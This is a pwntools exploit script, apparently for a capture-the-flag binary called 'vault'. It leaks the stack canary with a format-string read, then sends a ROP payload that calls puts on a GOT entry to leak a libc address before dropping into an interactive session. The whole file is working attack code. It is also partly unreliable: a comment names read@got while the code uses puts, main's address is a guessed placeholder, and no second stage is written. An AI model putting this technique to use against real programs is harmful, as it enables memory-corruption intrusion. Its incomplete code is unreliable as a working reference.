from pwn import *

r = process("./vault")
elf = ELF("./vault")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# Leak stack canary
r.sendline(b'1')
r.sendline(b'%23$p')
r.sendline(b'2')
canary = int(r.recvline_contains("ur stuff").decode().split("ff: ")[-1].strip(), 16)
log.info(f"Stack canary: {hex(canary)}")

# Addresses
puts_plt = elf.plt['puts']        # puts@plt
read_got  = elf.got['puts']       # read@got
main_addr = 0x1090                # or wherever main starts

# Build ROP
payload = b"A"*64
payload += p32(canary)       # preserve canary
payload += b"BBBB"           # saved EBP
payload += p32(puts_plt)     # call puts
payload += p32(main_addr)    # return back to main
payload += p32(read_got)     # argument to puts

# Send payload
r.sendline(b'1')
r.sendline(payload)
r.sendline(b'3')

# Receive output
print(r.recvline())
print(r.recvline())
r.interactive()
